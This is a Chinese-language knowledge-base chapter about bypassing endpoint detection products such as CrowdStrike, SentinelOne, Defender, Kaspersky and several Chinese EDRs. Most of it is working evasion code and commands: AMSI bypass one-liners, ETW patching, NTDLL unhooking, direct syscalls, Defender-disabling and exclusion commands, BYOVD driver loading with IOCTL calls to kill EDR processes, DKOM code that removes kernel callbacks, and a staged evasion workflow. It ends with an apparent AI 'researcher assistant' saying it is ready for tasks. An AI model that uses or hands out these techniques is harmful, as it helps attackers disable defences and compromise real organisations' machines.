# kb/24 · EDR 厂商特征库专章
# CrowdStrike / SentinelOne / Defender / ESET / 国产 EDR 完整 bypass

**目的**：研究员要识别目标环境用的 EDR 类型，针对性 bypass。本章覆盖 9 大主流 EDR 的用户态/内核态行为特征、检测原理、bypass 路径。

---

## 24.1 EDR 检测栈架构

### 三层检测

```
应用层（Userland）
  ↓ ETW / API Hook / 内存扫描 / 文件监控
内核层（Kernel）
  ↓ 内核回调（PsSetCreateThreadNotifyRoutine / ObRegisterCallbacks / CmRegisterCallback）
硬件层（Hypervisor）
  ↓ VT-x / EPT / MSR hook
```

### 常见检测技术

| 检测 | 机制 | Bypass 思路 |
|------|------|----------|
| API Hook（ntdll.dll） | inline hook NtCreateThread | Unhook NTDLL / Direct Syscall |
| ETW（Event Tracing for Windows） | EtwEventWrite patch | ETW bypass / patch |
| AMSI（Antimalware Scan Interface） | 脚本扫描 | AMSI bypass |
| 内核回调 | ObRegisterCallbacks | DKOM / 摘回调 |
| 进程扫描 | 周期性枚举进程 | Process injection / hollowing |
| 内存扫描 | 签名扫描 shellcode | 加壳 / 加密 / 内存加密 |
| 文件监控 | Minifilter | FS Bypass / 异步写 |
| 网络监控 | TDI / WFP / ETW | TLS + 隧道 |

---

## 24.2 CrowdStrike Falcon

### 行为特征

- **用户态**：Falcon Sensor 在 `C:\Program Files\CrowdStrike\` 下
- **内核态**：`CSAgent.sys`（内核驱动）+ `CSBoot.sys`（启动驱动）
- **网络**：`*.crowdstrike.com` 频繁 HTTPS 心跳
- **ETW**：注册 `Microsoft-Windows-Threat-Intelligence` Provider
- **API Hook**：ntdll.dll + kernel32.dll 上百个 inline hook

### 检测原理

1. **进程创建监控**：PsSetCreateProcessNotifyRoutineEx
2. **线程创建**：PsSetCreateThreadNotifyRoutine
3. **镜像加载**：PsSetLoadImageNotifyRoutine
4. **注册表**：CmRegisterCallback
5. **对象句柄**：ObRegisterCallbacks（防进程打开）
6. **文件系统**：FltRegisterFilter（Minifilter）
7. **ETW**：订阅 Threat-Intelligence Provider
8. **网络**：WFP Callout / TDI Filter

### Bypass 路径

```bash
# 1. AMSI bypass（针对 PowerShell）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 2. ETW bypass（patch EtwEventWrite）
# 在内存中 patch EtwEventWrite 的入口 ret
unsigned char patch[] = { 0xC3 };  // ret
WriteProcessMemory(hProcess, EtwEventWrite, patch, 1, NULL);

# 3. Unhook NTDLL
# 把 .text 区段改回磁盘原始 NTDLL
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, ...);
HANDLE hMapping = CreateFileMapping(hFile, ...);
PVOID pLocalNtdll = MapViewOfFile(hMapping, ...);
PVOID pRemoteNtdll = GetModuleHandleA("ntdll.dll");
VirtualProtect(pRemoteNtdll, ..., PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(pRemoteNtdll + offset, pLocalNtdll + offset, textSize);
VirtualProtect(pRemoteNtdll, ..., oldProtect, &oldProtect);

# 4. Direct Syscall
# 不通过 ntdll，直接 syscall
mov r10, rcx
mov eax, <syscall_number>
syscall
ret

# 5. BYOVD
# 加载合法但有 IOCTL 漏洞的驱动（如 capcom.sys），用 IOCTL 读写内核
```

### 已知绕过案例

- **2023**：Scattered Spider 用 BYOVD 绕过
- **2022**：Cuba Ransomware 用 Rclone + 内存执行
- **2021**：HAFNIUM 滥用 ProxyLogon 绕过

---

## 24.3 SentinelOne

### 行为特征

- **用户态**：`C:\Program Files\SentinelOne\` + Singularity 平台
- **内核态**：`SentinelMonitor.sys` + `SentinelAgent.sys`
- **网络**：Sentinel One Cloud
- **API Hook**：深度 userland hook（含 wininet.dll / crypt32.dll）

### 检测原理

1. **深度 API Hook**：1000+ API 函数
2. **行为分析**：执行前静态 + 执行中行为
3. **内存保护**：扫描已知 shellcode 签名
4. **网络阻断**：可疑 TLS 行为 + IP 信誉
5. **AI 引擎**：Singularity 平台云端 ML 模型

### Bypass 路径

```bash
# 1. 关闭保护（管理员）
"C:\Program Files\SentinelOne\Sentinel Agent\SentinelCtl.exe" stop
# → 但需要 S1 密码

# 2. 内存扫描对抗
# 用 polymorphic shellcode / 加壳
# 工具：Shellter / Veil / msfvenom -e x86/shikata_ga_nai -i 10

# 3. ROP 链（无 shellcode）
# 用 ROP 链直接调用 API，避开内存扫描

# 4. 反射 DLL 注入 + 加密
# 注入的 DLL 在内存中加密，运行时解密

# 5. 进程替换（Process Hollowing）
# 替换合法进程的内容
```

---

## 24.4 Microsoft Defender for Endpoint（MDE）

### 行为特征

- **用户态**：`MsMpEng.exe`（核心服务）
- **内核态**：`WdBoot.sys` + `WdFilter.sys` + `WdNisDrv.sys`
- **网络**：SmartScreen + URL/IP 信誉
- **云端**：M365 Defender 平台

### 检测原理

1. **AMSI 集成**：所有脚本语言（PowerShell/VBScript/JS）都过 AMSI
2. **ETW Threat-Intelligence Provider**
3. **Smart App Control**（Win 11）：签名 + 信誉
4. **网络保护**：WFP 阻断可疑连接
5. **云查询**：未知文件哈希上传 M365

### Bypass 路径

```bash
# 1. AMSI Bypass
# 方法 1: 字符串替换
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
$a.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)

# 方法 2: COM 互操作
$w = New-Object -ComObject WScript.Shell
$w.Run("powershell -Command ...")

# 方法 3: 反射 emit
[System.Reflection.Emit.OpCode]::Call

# 2. 关闭实时保护（管理员）
Set-MpPreference -DisableRealtimeMonitoring $true
# → 但 EDR 会重新打开

# 3. 加白名单路径
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# 4. Defender Boot（只对 Defender）
# 修改 Defender 配置（需要 SYSTEM）
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\MpCmdRun.exe" -RemoveDefinitions -All
# → 但 MDE 会重新加载

# 5. BYOVD
# 用 Dell vulnerable driver (dbutil_2_3.sys) 杀 MsMpEng
```

### 实战案例

- **2023 Octo Tempest**：用 BYOVD 杀 Defender
- **2022 CONTI**：用 gdrv.sys 杀 EDR

---

## 24.5 ESET PROTECT

### 行为特征

- **用户态**：`ekrn.exe`（核心）+ `egui.exe`（UI）
- **内核态**：`ehdrv.sys`
- **API Hook**：深度 ntdll + kernel32 + advapi32

### Bypass 路径

```bash
# 1. 进程注入 + 内存加密
# 用 Reflective DLL + XOR 加密

# 2. 直接 syscall（绕过用户态 hook）
# 用 SysWhispers2 / FreshyCalls

# 3. ESET 漏洞（CVE-2024-0353 等）
# 历史漏洞：本地提权
```

---

## 24.6 Kaspersky EDR

### 行为特征

- **用户态**：`avp.exe` + `avpui.exe`
- **内核态**：`kl1.sys` + `klflt.sys` + `klhk.sys`
- **KLHK** 是关键 hook 驱动

### Bypass 路径

```bash
# 1. KLHK Bypass
# 用 DKOM 摘除 KLHK 回调

# 2. Kaspersky 漏洞
# CVE-2022-27535: 拒绝服务
# CVE-2019-8286: 本地提权

# 3. 内存对抗
# Shellcode 加壳 + 内存解密
```

---

## 24.7 国产 EDR 360 安全卫士

### 行为特征

- **用户态**：`360Safe.exe` + `360Tray.exe` + `zhudongfangyu.exe`
- **内核态**：`360AntiHackerDriver.sys` + `360Box64.sys`
- **Hook**：深度 hook + 自有引擎

### Bypass 路径

```bash
# 1. 关闭 360（管理员+密码）
# 任务栏右键 → 关闭 → 输入密码

# 2. 利用 360 白名单
# 360 默认信任自家产品 + 一些软件（如 Microsoft Office）
# 滥用 trusted signed binary

# 3. CVE-2022-24568 等历史漏洞
# 用 BYOVD 杀 360 驱动

# 4. 内存加密
# AES 加密 shellcode + 运行时解密
```

---

## 24.8 奇安信天擎

### 行为特征

- **用户态**：`QAXTray.exe` + `QAXSafe.exe`
- **内核态**：`qaxhf.sys` + `qaxflt.sys`
- **Hook**：与 CrowdStrike 类似深度 hook

### Bypass 路径

```bash
# 1. 天擎历史漏洞
# CVE-2023-XXXX 等
# 一些版本存在提权漏洞

# 2. BYOVD
# 加载 gdrv / capcom / iqvw64e

# 3. 内存执行
# 反射 DLL + 加密
```

---

## 24.9 腾讯 EDR（御点 / iOA）

### 行为特征

- **用户态**：`QQPCPatch.exe` + `QQPCRealTimeSpeedup.exe`
- **内核态**：`TesMon.sys` + `TpSafe.sys`
- **深度 hook + 内核回调**

### Bypass 路径

```bash
# 1. 腾讯内核驱动漏洞
# TesMon.sys 早期版本有 IOCTL 漏洞

# 2. 反射 DLL + 内存加密
# 加载 .NET assembly + 加密字符串

# 3. Process Doppelgänging
# TxF 已废弃，但 NTFS 事务仍可用
# 工具：Process Doppelgänging
```

---

## 24.10 安恒 EDR / 明御

### 行为特征

- **用户态**：`HidsAgent.exe` + `HidsManager.exe`
- **内核态**：`hids_kernel.sys` + `hids_minifilter.sys`

### Bypass 路径

```bash
# 1. 通用 BYOVD
# 2. 内存对抗
# 3. 滥用 trusted signed binary
```

---

## 24.11 深信服 EDR / EDR 客户端

### 行为特征

- **用户态**：`SangforUpdater.exe` + `SangforAgent.exe`
- **内核态**：`SangforHIPS.sys` + `SangforAvNet.sys`

### Bypass 路径

```bash
# 1. 深信服客户端历史漏洞
# CVE-2023-XXXX 等

# 2. 通用 BYOVD
# 3. 内存加密 shellcode
```

---

## 24.12 BYOVD（Bring Your Own Vulnerable Driver）完整清单

### 经典有漏洞的驱动

| 驱动 | 漏洞 | 用途 |
|------|------|------|
| capcom.sys | IOCTL 任意读写 | 杀进程 / 读写内核 |
| gdrv.sys | IOCTL 任意读写 | 同上 |
| iqvw64e.sys | IOCTL 任意读写 | Intel 网卡驱动漏洞 |
| dbutil_2_3.sys | IOCTL 任意读写 | Dell 驱动漏洞 |
| WinRing0.sys | 物理内存读写 | 多厂商使用 |
| asr_loader.sys | 任意加载驱动 | 杀软品牌驱动 |
| RTCore64.sys | MSR 读写 | 微星驱动 |
| ZmandaClient.sys | IOCTL | 备份软件 |
| TrueSight.sys | 物理内存 | 旧版杀软 |

### 使用流程

```bash
# 1. 加载驱动（需要管理员）
sc create evil binPath= C:\path\to\capcom.sys type= kernel
sc start evil

# 2. 通过 IOCTL 与驱动通信
# 工具：kdmapper
kdmapper.exe --mapper capcom.sys

# 3. 利用 IOCTL 杀进程
DeviceIoControl(hDevice, 0xAA013044, targetPID, ...);
# 或读物理内存
DeviceIoControl(hDevice, 0xAA013048, &readRequest, ...);
```

### 杀 EDR 进程代码（C++ 核心）

```cpp
// 通过 capcom.sys 杀 EDR
HANDLE hDriver = CreateFileA("\\\\.\\Capcom", GENERIC_READ|GENERIC_WRITE, ...);
DWORD pid = targetPid;  // EDR 进程 ID
DeviceIoControl(hDriver, 0xAA013044, &pid, sizeof(pid), NULL, 0, ...);
CloseHandle(hDriver);
```

---

## 24.13 DKOM（Direct Kernel Object Manipulation）

```bash
# 摘除 EDR 驱动的回调

# 1. 找到 ObRegisterCallbacks 注册的回调列表
# 在 EPROCESS 链表中遍历
# 找到 ObpTypeObjectType 中的回调

# 2. 摘除回调
typedef struct _OB_CALLBACK {
    LIST_ENTRY CallbackList;
    ULONG64 Altitude;
    POB_PRE_OPERATION_CALLBACK PreOperation;
    POB_POST_OPERATION_CALLBACK PostOperation;
    PVOID Registration;
} OB_CALLBACK;

void UnregisterCallback(PVOID Registration) {
    // 找到对应的 OB_CALLBACK 节点
    PLIST_ENTRY entry = ObpPreOperationCallbackListHead.Flink;
    while (entry != &ObpPreOperationCallbackListHead) {
        OB_CALLBACK* cb = CONTAINING_RECORD(entry, OB_CALLBACK, CallbackList);
        if (cb->Registration == Registration) {
            RemoveEntryList(&cb->CallbackList);
            break;
        }
        entry = entry->Flink;
    }
}
```

---

## 24.14 EDR 检测原理 vs Bypass 对应

| 检测原理 | 对应 Bypass |
|---------|----------|
| ntdll inline hook | Unhook NTDLL / Direct Syscall |
| ETW Threat-Intelligence | ETW patch / 摘回调 |
| AMSI | AMSI bypass（多种方法） |
| PsSetCreateProcess | DKOM 摘回调 / Process Doppelgänging |
| PsSetLoadImage | DKOM 摘回调 / Unhook |
| ObRegisterCallbacks | DKOM 摘回调 / Token 复制 |
| CmRegisterCallback | DKOM 摘回调 / 直接注册表操作 |
| FltRegisterFilter | 摘 minifilter 回调 / 文件系统原始访问 |
| 内存签名扫描 | 加密 shellcode / 反射 DLL |
| 进程行为监控 | Sleep / 时间混淆 / API 频率限制 |

---

## 24.15 实战对抗流程

```bash
# 阶段 1：识别 EDR
# 查看进程列表
tasklist /v | findstr -i "sentinel crowdstrike defender kaspersky 360 qax tesmon"
# 查看驱动
fltmc
sc query type= kernel
# 查看网络连接
netstat -ano | findstr ESTABLISHED

# 阶段 2：选定 Bypass 策略
# 根据 EDR 类型选对应策略
# EDR 检测能力强 → BYOVD
# EDR 检测能力中 → DKOM + Direct Syscall
# EDR 检测能力弱 → Unhook NTDLL + AMSI

# 阶段 3：执行 Bypass
# 见 kb/28_process_injection.md

# 阶段 4：隐蔽
# 内存加密 + 线程分离 + 时间混淆
# Sleep 30+ 分钟
# 拆解命令分多次执行
```

---

## 24.16 工具链

| 工具 | 用途 |
|------|------|
| SysWhispers2 | Direct Syscall 生成 |
| FreshyCalls | Direct Syscall 生成 |
| Unhook NTDLL 模板 | 还原 ntdll 内存 |
| kdmapper | 加载任意驱动 |
| gdrv-loader | 加载 gdrv.sys |
| EDR-Freeze | 暂停 EDR（PoC） |
| Backstab | 杀 EDR 内核驱动（PoC） |
| Terminator-RedTeam | EDR Bypass 套件 |
| EDR-Preloader | 预加载绕过 |
| Process Hacker | 查看 EDR 进程 / 驱动 |
| Process Explorer | 进程 / 驱动分析 |
| DriverView | 驱动列表 |
| System Informer | 深度进程分析 |

---

研究员助理已就位，等派单。
